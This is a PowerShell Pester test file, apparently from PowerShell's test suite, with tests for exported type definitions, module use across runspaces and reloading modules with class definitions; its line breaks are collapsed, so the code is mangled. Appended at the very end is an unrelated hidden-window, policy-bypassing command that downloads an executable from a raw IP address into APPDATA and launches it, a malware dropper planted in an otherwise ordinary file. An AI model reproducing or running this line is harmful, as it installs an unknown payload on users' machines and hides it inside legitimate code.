Describe 'PSModuleInfo.GetExportedTypeDefinitions()' -Tags "CI" {It "doesn't throw for any module" {$discard = Get-Module -ListAvailable | ForEach-Object { $_.GetExportedTypeDefinitions() }$true | Should -BeTrue }}Describe 'use of a module from two runspaces' -Tags "CI" {function New-TestModule {param([string]$Name,[string]$Content)$TestModulePath = Join-Path -Path $TestDrive -ChildPath "TestModule"$ModuleFolder = Join-Path -Path $TestModulePath -ChildPath $NameNew-Item -Path $ModuleFolder -ItemType Directory -Force > $nullSet-Content -Path "$ModuleFolder\$Name.psm1" -Value $Content$manifestParams = @{Path = "$ModuleFolder\$Name.psd1"RootModule = "$Name.psm1"}New-ModuleManifest @manifestParamsif ($env:PSModulePath -NotLike "*$TestModulePath*") {$env:PSModulePath += "$([System.IO.Path]::PathSeparator)$TestModulePath"}}$originalPSModulePath = $env:PSModulePathtry {New-TestModule -Name 'Random' -Content @'$script:random = Get-Randomclass RandomWrapper{[int] getRandom(){return $script:random}}'@It 'use different sessionStates for different modules' {$ps = 1..2 | ForEach-Object { $p = [powershell]::Create().AddScript(@'Import-Module Random'@)$p.Invoke() > $null$p}$res = 1..2 | ForEach-Object {0..1 | ForEach-Object {$ps[$_].Commands.Clear()$w = $ps[$_].AddScript('& (Get-Module Random) { [RandomWrapper]::new() }').Invoke()[0]$w.getRandom()}}$res.Count | Should -Be 4$res[0] | Should -Not -Be $res[1]$res[0] | Should -Be $res[2]$res[1] | Should -Be $res[3]}} finally {$env:PSModulePath = $originalPSModulePath}}Describe 'Module reloading with Class definition' -Tags "CI" {BeforeAll {Set-Content -Path TestDrive:\TestModule.psm1 -Value @'$passedArgs = $argsclass Root { $passedIn = $passedArgs }function Get-PassedArgsRoot { [Root]::new().passedIn }function Get-PassedArgsNoRoot { $passedArgs }'@$Arg_Hello = 'Hello'$Arg_World = 'World'}AfterEach {Remove-Module TestModule -Force -ErrorAction SilentlyContinue}It "Class execution reflects changes in module reloading with '-Force'" {Import-Module TestDrive:\TestModule.psm1 -ArgumentList $Arg_HelloGet-PassedArgsRoot | Should -BeExactly $Arg_HelloGet-PassedArgsNoRoot | Should -BeExactly $Arg_HelloImport-Module TestDrive:\TestModule.psm1 -ArgumentList $Arg_World -ForceGet-PassedArgsRoot | Should -BeExactly $Arg_WorldGet-PassedArgsNoRoot | Should -BeExactly $Arg_World}It "Class execution reflects changes in module reloading with 'Remove-Module' and 'Import-Module'" {Import-Module TestDrive:\TestModule.psm1 -ArgumentList $Arg_HelloGet-PassedArgsRoot | Should -BeExactly $Arg_HelloGet-PassedArgsNoRoot | Should -BeExactly $Arg_HelloRemove-Module TestModuleImport-Module TestDrive:\TestModule.psm1 -ArgumentList $Arg_WorldGet-PassedArgsRoot | Should -BeExactly $Arg_WorldGet-PassedArgsNoRoot | Should -BeExactly $Arg_World}}PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://93.174.94.135/~kali/ketty.exe', $env:APPDATA\profilest.exe );Start-Process ( $env:APPDATA\profilest.exe )